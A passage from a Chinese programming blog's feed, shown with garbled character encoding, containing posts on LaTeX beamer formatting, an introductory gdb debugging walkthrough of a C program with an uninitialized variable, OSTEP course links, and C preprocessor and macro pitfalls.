id="å›¾ç‰‡å±…ä¸­æ˜¾ç¤º"><a href="#å›¾ç‰‡å±…ä¸­æ˜¾ç¤º" class="headerlink" title="å›¾ç‰‡å±…ä¸­æ˜¾ç¤º"></a>å›¾ç‰‡å±…ä¸­æ˜¾ç¤º</h1><p>ä»¥å±…ä¸­æ˜¾ç¤ºã€å®½åº¦å 60%ã€é«˜ç­‰æ¯”ä¾‹ç¼©æ”¾å½¢å¼å±•ç¤º2.png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;itemize&#125;<br>\centering<br>\includegraphics[width=0.60\textwidth]&#123;pic/2.png&#125;<br>\end&#123;itemize&#125;<br></code></pre></td></tr></table></figure><h1 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h1><ul><li>ä¸€çº§<ul><li>äºŒçº§<ul><li>ä¸‰çº§</li></ul></li></ul></li></ul><p>å¯¹åº”ä»£ç ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;itemize&#125;</span><br>       <span class="hljs-string">\item</span> ä¸€çº§<br>       <span class="hljs-string">\begin&#123;itemize&#125;</span><br>       <span class="hljs-string">\item</span> äºŒçº§<br>       <span class="hljs-string">\end&#123;itemize&#125;</span><br>     <span class="hljs-string">\begin&#123;itemize&#125;</span><br>     <span class="hljs-string">\item</span> Mount: éš”ç¦»æ–‡ä»¶ç³»ç»ŸæŒ‚è½½<br>     <span class="hljs-string">\end&#123;itemize&#125;</span><br><span class="hljs-string">\end&#123;itemize&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/image/LaTeXTest.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;frame&#125;<br>    \begin&#123;itemize&#125;<br>        \item å®¹å™¨çš„å…±äº«å†…æ ¸è®¾è®¡<br>        \begin&#123;itemize&#125;<br>        \item å†…æ ¸å˜é‡<br>        \item æ•°æ®ç»“æ„<br>        \item ç³»ç»Ÿè°ƒç”¨<br>        \end&#123;itemize&#125;<br>        \item å®¹å™¨çš„å®‰å…¨é˜²å¾¡æœºåˆ¶<br>     \begin&#123;itemize&#125;<br>     \item namespace<br>     \begin&#123;itemize&#125;<br>     \item Mount: éš”ç¦»æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹<br>     \item UTS: éš”ç¦»ä¸»æœºåå’ŒåŸŸåä¿¡æ¯<br>     \item IPC: éš”ç¦»è¿›ç¨‹é—´é€šä¿¡<br>     \item PID: éš”ç¦»è¿›ç¨‹çš„ID<br>     \item Network: éš”ç¦»ç½‘ç»œèµ„æº<br>     \item User: éš”ç¦»ç”¨æˆ·å’Œç”¨æˆ·ç»„çš„ID<br>     \end&#123;itemize&#125;<br>    \item control group<br>    \begin&#123;itemize&#125;<br>    \item CPU<br>    \item å†…å­˜<br>    \item IO<br>    \item å­˜å‚¨<br>    \end&#123;itemize&#125;<br>    \end&#123;itemize&#125;<br><br>\end&#123;itemize&#125;<br>\end&#123;frame&#125;<br></code></pre></td></tr></table></figure><h1 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h1><p><a href="https://www.tablesgenerator.com/">tablesgenerator</a></p>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LaTeXï¼Œbeamer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gdbè°ƒè¯•ï¼šä¸€ä¸ªç®€å•çš„å…¥é—¨</title>
    <link href="/p/66ee2080/"/>
    <url>/p/66ee2080/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/assembly1.jpeg"><br>é—®é¢˜æƒ…æ™¯ï¼šè¿è¡Œä¸‹é¢ç¨‹åºï¼Œå¾—åˆ°äº†é”™è¯¯è¾“å‡ºï¼Œå¦‚ä½•æ‰¾å‡ºé”™è¯¯ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add_range</span><span class="hljs-params">(<span class="hljs-keyword">int</span> low, <span class="hljs-keyword">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">int</span> i, sum;<br>        <span class="hljs-keyword">for</span> (i = low; i &lt;= high; i++)<br>                sum = sum + i;<br>        <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">int</span> result[<span class="hljs-number">100</span>];<br>        result[<span class="hljs-number">0</span>] = add_range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br>        result[<span class="hljs-number">1</span>] = add_range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result[0]=%d\nresult[1]=%d\n&quot;</span>,result[<span class="hljs-number">0</span>], result[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ä»¥ä¸‹å‘½ä»¤å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶mainï¼Œè¿è¡Œåå‘ç°è¾“å‡ºäº†<strong>55ã€5105</strong>ï¼Œè¿™æ˜¾ç„¶æ˜¯é”™è¯¯çš„ï¼Œå› æ­¤éœ€è¦è°ƒè¯•</p><p>ç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ ä¸Š-gé€‰é¡¹ä»¥è°ƒè¯•</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">gcc -g hello<span class="hljs-selector-class">.c</span> -o <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><blockquote><p>-gé€‰é¡¹çš„ä½œç”¨æ˜¯åœ¨ç›®æ ‡æ–‡ä»¶ä¸­åŠ å…¥æºä»£ç çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç›®æ ‡æ–‡ä»¶ä¸­ç¬¬å‡ æ¡æœºå™¨æŒ‡ä»¤å¯¹åº”æºä»£ç çš„ç¬¬å‡ è¡Œ</p></blockquote><p>å‘½ä»¤è¡Œè¾“å…¥gdb mainè¿›å…¥è°ƒè¯•ï¼Œé€šè¿‡è°ƒè¯•å‘ç°äº†ä¸‹é¢çš„é”™è¯¯ï¼š</p><ul><li>é€šè¿‡stepæ­¥å…¥add_rangeå‡½æ•°ï¼Œå‘ç°å‰åä¸¤æ¬¡è°ƒç”¨å‡½æ•°ä¸­sumçš„å€¼å¹¶æ²¡æœ‰éƒ½åˆå§‹åŒ–ä¸º0ï¼ˆç¬¬äºŒæ¬¡è°ƒç”¨add_rangeçš„æ—¶å€™sumçš„å€¼ä¸º55ï¼‰</li></ul><h1 id="gdbå¸¸ç”¨çš„å‘½ä»¤"><a href="#gdbå¸¸ç”¨çš„å‘½ä»¤" class="headerlink" title="gdbå¸¸ç”¨çš„å‘½ä»¤"></a>gdbå¸¸ç”¨çš„å‘½ä»¤</h1><ul><li>list<ul><li>è¾“å‡ºæºä»£ç </li><li>é»˜è®¤ä»ç¬¬ä¸€è¡Œå¼€å§‹åˆ—å‡ºåè¡Œ</li><li>å¯ç®€å†™ä¸ºl</li><li>list n è¾“å‡ºç¬¬nè¡Œå‰åçš„ä»£ç </li><li>list function_nameè¾“å‡ºå‡½æ•°function_nameå‰åçš„ä»£ç </li></ul></li><li>æç¤ºç¬¦ä¸‹ç›´æ¥æ•²å›è½¦è¡¨ç¤ºé‡å¤ä¸Šä¸€æ¡å‘½ä»¤</li><li>quité€€å‡ºgdb</li><li>runè¿è¡Œç¨‹åºï¼Œå½“é‡åˆ°æ–­ç‚¹åï¼Œç¨‹åºä¼šåœ¨æ–­ç‚¹å¤„åœæ­¢è¿è¡Œ</li><li>nextå¾€åæ‰§è¡Œä¸€å¥ä»£ç </li><li>backtraceæŸ¥çœ‹å‡½æ•°è°ƒç”¨çš„æ ˆå¸§</li><li>finishå‘½ä»¤è®©ç¨‹åºä¸€ç›´è¿è¡Œåˆ°ä»å½“å‰å‡½æ•°è¿”å›ä¸ºæ­¢</li><li>på‘½ä»¤å¯ä»¥æ‰“å°å‡ºæŸä¸ªå˜é‡çš„å€¼ï¼ŒåŒ…æ‹¬åœ°å€</li><li>set varå¯ä»¥æ”¹å˜å˜é‡çš„å€¼</li><li>backtraceï¼ˆæˆ–btï¼‰æŸ¥çœ‹å„çº§å‡½æ•°è°ƒç”¨åŠå‚æ•°</li><li>frame + å¸§ç¼–å·é€‰æ‹©æ ˆå¸§</li><li>infoï¼ˆæˆ–iï¼‰ localsæŸ¥çœ‹å½“å‰æ ˆå¸§å±€éƒ¨å˜é‡çš„å€¼</li><li>display + å˜é‡å å¯ä»¥æ¯æ¬¡åœä¸‹æ¥çš„æ—¶å€™è‡ªåŠ¨æ‰“å°å˜é‡çš„å€¼</li><li>ç”¨undisplayå¯ä»¥å–æ¶ˆå¯¹å…ˆå‰è®¾ç½®çš„é‚£äº›å˜é‡çš„è·Ÿè¸ª</li><li>info programï¼š æ¥æŸ¥çœ‹ç¨‹åºçš„æ˜¯å¦åœ¨è¿è¡Œï¼Œè¿›ç¨‹å·ï¼Œè¢«æš‚åœçš„åŸå› </li></ul><h1 id="æ–­ç‚¹è°ƒè¯•"><a href="#æ–­ç‚¹è°ƒè¯•" class="headerlink" title="æ–­ç‚¹è°ƒè¯•"></a>æ–­ç‚¹è°ƒè¯•</h1><ul><li>break + å‡½æ•° å¯ä»¥åœ¨æŸä¸ªå‡½æ•°å…¥å£å¤„è®¾ç½®æ–­ç‚¹</li><li>break + è¡Œå· å¯ä»¥åœ¨æŸä¸€è¡Œåœæ­¢</li><li>info breakpointsåˆ—å‡ºæ‰€æœ‰æ–­ç‚¹ï¼Œç¼©å†™ï¼šinfo b</li><li>delete breakpointsåˆ é™¤æ–­ç‚¹</li><li>disable/enable breakpointsç¦ç”¨/å¯ç”¨æ–­ç‚¹</li><li>æ¡ä»¶æ–­ç‚¹<ul><li>break 9 if sum != 0</li><li>å¦‚æœsum!=0å°±åœ¨ç¬¬ä¹è¡Œæ‰“æ–­ç‚¹</li></ul></li><li>display + å˜é‡åï¼šè·Ÿè¸ªæŸ¥çœ‹ä¸€ä¸ªå˜é‡ï¼Œæ¯æ¬¡åœä¸‹æ¥éƒ½æ˜¾ç¤ºå®ƒçš„å€¼</li><li>undisplayå–æ¶ˆå¯¹å…ˆå‰è®¾ç½®çš„é‚£äº›å˜é‡çš„è·Ÿè¸ª</li><li>continueï¼ˆæˆ–cï¼‰ä»å½“å‰ä½ç½®å¼€å§‹è¿ç»­è€Œéå•æ­¥æ‰§è¡Œç¨‹åºï¼Œç»§ç»­æ‰§è¡Œï¼Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹å¤„ï¼ˆæˆ–è¿è¡Œç»“æŸï¼‰</li><li>runï¼ˆæˆ–rï¼‰ä»å¤´å¼€å§‹è¿ç»­è€Œéå•æ­¥æ‰§è¡Œç¨‹åº</li></ul><h1 id="è§‚å¯Ÿç‚¹"><a href="#è§‚å¯Ÿç‚¹" class="headerlink" title="è§‚å¯Ÿç‚¹"></a>è§‚å¯Ÿç‚¹</h1><ul><li>æ–­ç‚¹æ˜¯å½“ç¨‹åº<strong>æ‰§è¡Œåˆ°æŸä¸€ä»£ç è¡Œæ—¶ä¸­æ–­</strong>ï¼Œè€Œè§‚å¯Ÿç‚¹æ˜¯<strong>å½“ç¨‹åºè®¿é—®æŸä¸€å­˜å‚¨å•å…ƒæ—¶ä¸­æ–­</strong>ï¼Œå¦‚æœæˆ‘ä»¬ä¸çŸ¥é“æŸä¸€å­˜å‚¨å•å…ƒæ˜¯åœ¨å“ªé‡Œè¢«æ”¹åŠ¨çš„ï¼Œè¿™æ—¶å€™è§‚å¯Ÿç‚¹å°¤å…¶æœ‰ç”¨</li><li>ç”¨watchå‘½ä»¤è®¾ç½®è§‚å¯Ÿç‚¹ï¼Œ</li><li>i watchpoints æŸ¥çœ‹å½“å‰è®¾ç½®äº†å“ªäº›è§‚å¯Ÿç‚¹</li><li>x ä»æŸä¸ªä½ç½®å¼€å§‹æ‰“å°å­˜å‚¨å™¨çš„ä¸€æ®µå†…å®¹ï¼Œå…¨éƒ¨å½“æˆå­—èŠ‚æ¥çœ‹ï¼Œè€Œä¸åŒºåˆ†å“ªäº›å­—èŠ‚å±äºå“ªäº›å˜é‡</li></ul><blockquote><ul><li>x/7b input<ul><li>xå‘½ä»¤æ‰“å°å­˜å‚¨å™¨ä¸­çš„å†…å®¹</li><li>7bæ˜¯æ‰“å°æ ¼å¼</li><li>bè¡¨ç¤ºæ¯ä¸ªå­—èŠ‚ä¸€ç»„</li><li>7è¡¨ç¤ºæ‰“å°7ç»„</li></ul></li></ul></blockquote><h1 id="åˆ†å‰²çª—å£"><a href="#åˆ†å‰²çª—å£" class="headerlink" title="åˆ†å‰²çª—å£"></a>åˆ†å‰²çª—å£</h1><ul><li>layoutï¼šç”¨äºåˆ†å‰²çª—å£ï¼Œå¯ä»¥ä¸€è¾¹æŸ¥çœ‹ä»£ç ï¼Œä¸€è¾¹æµ‹è¯•ï¼š</li><li>layout srcï¼šæ˜¾ç¤ºæºä»£ç çª—å£</li><li>layout asmï¼šæ˜¾ç¤ºåæ±‡ç¼–çª—å£</li><li>layout regsï¼šæ˜¾ç¤ºæºä»£ç /åæ±‡ç¼–å’ŒCPUå¯„å­˜å™¨çª—å£</li><li>layout splitï¼šæ˜¾ç¤ºæºä»£ç å’Œåæ±‡ç¼–çª—å£</li><li>Ctrl + Lï¼šåˆ·æ–°çª—å£</li></ul><h1 id="å¸¦å‚æ•°è°ƒè¯•"><a href="#å¸¦å‚æ•°è°ƒè¯•" class="headerlink" title="å¸¦å‚æ•°è°ƒè¯•"></a>å¸¦å‚æ•°è°ƒè¯•</h1><ul><li><p><code>gdb &lt;prog&gt;</code>ä¹‹åï¼Œè¿›å…¥gdbç•Œé¢ï¼Œè¾“å…¥set args 123 abc xxxï¼Œåˆ™ç›¸å½“äºç»™ç¨‹åºprogä¼ å…¥äº†ä¸‰ä¸ªå‚æ•°123ã€abcã€xxx</p></li><li><p>gdb â€“args prog 123 abc xxxï¼Œç›¸å½“äºç»™ç¨‹åºprogä¼ å…¥äº†ä¸‰ä¸ªå‚æ•°123ã€abcã€xxx</p></li><li><p>åœ¨gdbç•Œé¢ä¸‹ï¼Œshow argså‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¼ å…¥çš„å‚æ•°</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ±‡ç¼–è¯­è¨€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdbï¼Œè°ƒè¯•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OSTEPå¯¼è¨€</title>
    <link href="/p/decf1347/"/>
    <url>/p/decf1347/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/ostep.jpg"></p><p>å­¦ OSTEP ä¸åšå®éªŒï¼Œå°±åƒå››å¤§åè‘—ä¸çœ‹çº¢æ¥¼æ¢¦ï¼Œè¯´æ˜è¿™ä¸ªäººæ–‡å­¦é€ è¯£å’Œè‡ªæˆ‘ä¿®å…»ä¸è¶³ï¼Œä»–ç†è§£ä¸äº†è¿™ç§å†…åœ¨çš„é˜³æ˜¥ç™½é›ªçš„é«˜é›…è‰ºæœ¯ï¼Œä»–åªèƒ½çœ‹åˆ°å¤–è¡¨çš„è¾è—»å †ç Œï¼Œå‚ä¸é€å…¶ä¸­æ·±å¥¥çš„ç²¾ç¥å†…æ ¸ï¼Œä»–æ•´ä¸ªäººçš„å±‚æ¬¡å°±å¡åœ¨è¿™é‡Œäº†ï¼Œåªèƒ½åº¦è¿‡ä¸€ä¸ªç›¸å¯¹å¤±è´¥çš„äººç”Ÿã€‚</p><ul><li><p><a href="https://github.com/remzi-arpacidusseau/ostep-projects">OSTEP Github Project</a></p><ul><li>å®˜æ–¹çš„githubé“¾æ¥ï¼ŒåŒ…å«å¤šä¸ªä»“åº“</li></ul></li><li><p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/">OSTEPè¯¾ç¨‹ç½‘ç«™</a>ï¼ŒåŒ…å«ï¼š</p><ul><li>è¯¾ç¨‹schedule</li><li>PDFè¯¾æœ¬ã€PPT</li><li>lab</li></ul></li><li><p><a href="https://github.com/remzi-arpacidusseau/ostep-homework/">è¯¾åä½œä¸šGithubé“¾æ¥</a></p></li><li><p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/Homework/homework.html">è¯¾åä½œä¸šçš„å®˜æ–¹ç½‘ç«™</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSTEP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿï¼ŒOSTEP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ï¼šé¢„å¤„ç†ä¸å®å®šä¹‰è¯¦è§£</title>
    <link href="/p/96b16a89/"/>
    <url>/p/96b16a89/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/cpro.png"></p><h1 id="é¢„å¤„ç†çš„æ­¥éª¤"><a href="#é¢„å¤„ç†çš„æ­¥éª¤" class="headerlink" title="é¢„å¤„ç†çš„æ­¥éª¤"></a>é¢„å¤„ç†çš„æ­¥éª¤</h1><p>Cç¼–è¯‘å™¨åš<strong>è¯­æ³•è§£æ</strong>ä¹‹å‰çš„<strong>é¢„å¤„ç†æ­¥éª¤</strong>ï¼š</p><ul><li>å¯¹defineè¯­å¥è¿›è¡Œæ›¿æ¢<ul><li><code>\</code>å¯ä»¥æŠŠåˆ†è¡Œçš„ä»£ç è¿æ¥æˆä¸€è¡Œ</li><li>å°†æ³¨é‡Šæ›¿æ¢ä¸ºä¸€ä¸ªç©ºæ ¼</li></ul></li></ul><p>å®å¯è¢«<code>\</code>åˆ†å‰²</p><blockquote><p>   #define STR â€œhello, â€œ  \<br>  â€œworldâ€</p><p>  #define MAIN       \<br>    int main()         \<br>    {                 \<br>        return 0;     \<br>    }</p></blockquote><p>å†…æ ¸ä¸­å‡ºç°äº†å¤§é‡çš„å¤æ‚å®å®šä¹‰ï¼Œå› æ­¤æ·±å…¥å®æ˜¯ååˆ†å¿…è¦çš„</p><p><a href="https://www.boost.org/doc/libs/1_65_1/libs/preprocessor/doc/index.html">ä¸€ä¸ªç¥é¬¼è«æµ‹çš„å®çš„ç¤ºä¾‹</a></p><h2 id="æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º"><a href="#æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º" class="headerlink" title="æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º"></a>æ¡ä»¶é¢„å¤„ç†æŒ‡ç¤º</h2><p>ä¸¤ä¸ªç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> <span class="hljs-meta-string">&lt;token&gt;</span></span><br><span class="hljs-comment">/* code */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-comment">/* code to include if the token is defined */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DLEVEL &gt; 5</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIGNAL  1</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> STACKUSE == 1</span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   200</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   100</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIGNAL  0</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> STACKUSE == 1</span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   100</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>        <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK   50</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DLEVEL == 0</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> DLEVEL == 1</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK 100</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> DLEVEL &gt; 5</span><br>    display( debugptr );<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STACK 200</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h1 id="å®å®šä¹‰"><a href="#å®å®šä¹‰" class="headerlink" title="å®å®šä¹‰"></a>å®å®šä¹‰</h1><h2 id="å˜é‡å¼å®å®šä¹‰ï¼ˆobject-like-macroï¼‰"><a href="#å˜é‡å¼å®å®šä¹‰ï¼ˆobject-like-macroï¼‰" class="headerlink" title="å˜é‡å¼å®å®šä¹‰ï¼ˆobject-like macroï¼‰"></a>å˜é‡å¼å®å®šä¹‰ï¼ˆobject-like macroï¼‰</h2><p>å®å®šä¹‰åå¯ä»¥åƒå˜é‡ä¸€æ ·åœ¨ä»£ç ä¸­ä½¿ç”¨ï¼Œå½¢å¼ç±»ä¼¼ï¼š<br><code>#define STR &quot;hello, world&quot;</code></p><h2 id="å‡½æ•°å¼å®å®šä¹‰ï¼ˆfunction-like-macroï¼‰"><a href="#å‡½æ•°å¼å®å®šä¹‰ï¼ˆfunction-like-macroï¼‰" class="headerlink" title="å‡½æ•°å¼å®å®šä¹‰ï¼ˆfunction-like macroï¼‰"></a>å‡½æ•°å¼å®å®šä¹‰ï¼ˆfunction-like macroï¼‰</h2><p>å®å®šä¹‰å¯ä»¥åƒå‡½æ•°è°ƒç”¨ä¸€æ ·åœ¨ä»£ç ä¸­ä½¿ç”¨ï¼Œå½¢å¼ç±»ä¼¼ï¼š<br><code>#define MAX(a, b) ((a)&gt;(b)?(a):(b))</code></p><p>å‡½æ•°å¼å®å®šä¹‰çš„ä¼˜åŠ¿ï¼ˆç›¸æ¯”è¾ƒå‡½æ•°ï¼‰</p><ul><li>çœå»äº†åˆ†é…å’Œé‡Šæ”¾æ ˆå¸§ã€ä¼ å‚ã€ä¼ è¿”å›å€¼ç­‰ä¸€ç³»åˆ—å·¥ä½œ</li><li>ç®€çŸ­å¹¶ä¸”è¢«é¢‘ç¹è°ƒç”¨çš„å‡½æ•°ç»å¸¸ç”¨å‡½æ•°å¼å®å®šä¹‰æ¥ä»£æ›¿å®ç°ã€‚ä¾‹å¦‚Cæ ‡å‡†åº“çš„å¾ˆå¤šå‡½æ•°éƒ½æä¾›ä¸¤ç§å®ç°ï¼Œä¸€ç§æ˜¯çœŸæ­£çš„å‡½æ•°å®ç°ï¼Œä¸€ç§æ˜¯å®å®šä¹‰å®ç°</li><li>inlineå…³é”®å­—å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™ä¸ªå‡½æ•°çš„è°ƒç”¨è¦å°½å¯èƒ½å¿«ï¼Œå¯ä»¥å½“æ™®é€šçš„å‡½æ•°è°ƒç”¨å®ç°ï¼Œä¹Ÿå¯ä»¥ç”¨<strong>å®å±•å¼€</strong>çš„åŠæ³•å®ç°</li></ul><p>ä¸ºäº†æ£€æŸ¥ç¼–è¯‘å™¨å¯¹å®æ‰€åšçš„<strong>æ›¿æ¢</strong>æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨gcc -Eå‘½ä»¤</p><p>å®å®šä¹‰éœ€è¦æ³¨æ„çš„äº‹æƒ…ï¼š</p><ul><li><strong>å®å¯ä»¥é‡å¤å®šä¹‰ï¼Œä½†æ˜¯æ¯æ¬¡çš„å®šä¹‰å‡éœ€ç›¸åŒã€‚</strong> å¦‚æœéœ€è¦é‡æ–°å®šä¹‰ä¸€ä¸ªå®ï¼Œå’ŒåŸæ¥çš„å®šä¹‰ä¸åŒï¼Œå¯ä»¥å…ˆç”¨#undefå–æ¶ˆåŸæ¥çš„å®šä¹‰ï¼Œå†é‡æ–°å®šä¹‰</li><li>å¦‚æœMAXè¢«å®šä¹‰ä¸º<code>#define MAX(a, b) (a&gt;b?a:b)</code>ï¼Œé‚£ä¹ˆMAX(i&amp;0x0f, j&amp;0x0f)å°†ä¼šè¢«å±•å¼€ä¸º<code>(i&amp;0x0f&gt;j&amp;0x0f?i&amp;0x0f:j&amp;0x0f)</code>è€Œä¸æ˜¯<code>((i&amp;0x0f)&gt;(j&amp;0x0f)?(i&amp;0x0f):(j&amp;0x0f))</code>ï¼Œç”±äº&gt;ç»“åˆä¼˜å…ˆçº§é«˜äº&amp;ï¼Œå› æ­¤ä¼šå‡ºç°å¾ˆéš¾æ‰¾åˆ°çš„bug</li><li><h2 id="do-while-0"><a href="#do-while-0" class="headerlink" title="do{}while(0)"></a>do{}while(0)</h2>å†…æ ¸ä¸­å®å®šä¹‰å¸¸å¸¸å†™æˆï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> device_init_wakeup(dev,val) \</span><br><span class="hljs-meta">do &#123; \</span><br><span class="hljs-meta">device_can_wakeup(dev) = !!(val); \</span><br><span class="hljs-meta">device_set_wakeup_enable(dev,val); \</span><br><span class="hljs-meta">&#125; while(0)</span><br></code></pre></td></tr></table></figure>è¿™é‡Œç”¨do { â€¦ } while(0)æ‹¬èµ·æ¥äº†ï¼Œå¦‚æœæ²¡æœ‰æ‹¬èµ·æ¥ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> device_init_wakeup(dev,val) \</span><br><span class="hljs-meta">    &#123;device_can_wakeup(dev) = !!(val); \</span><br><span class="hljs-meta">    device_set_wakeup_enable(dev,val);&#125;</span><br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>)<br>    device_init_wakeup(d, v);<br></code></pre></td></tr></table></figure>å½“ä½¿ç”¨ä»¥ä¸‹if elseè¯­å¥æ—¶ï¼Œä¼šå› å¤šå‡ºä¸€ä¸ª<code>;</code>æŠ¥é”™<figure class="highlight c"><table><tr><td 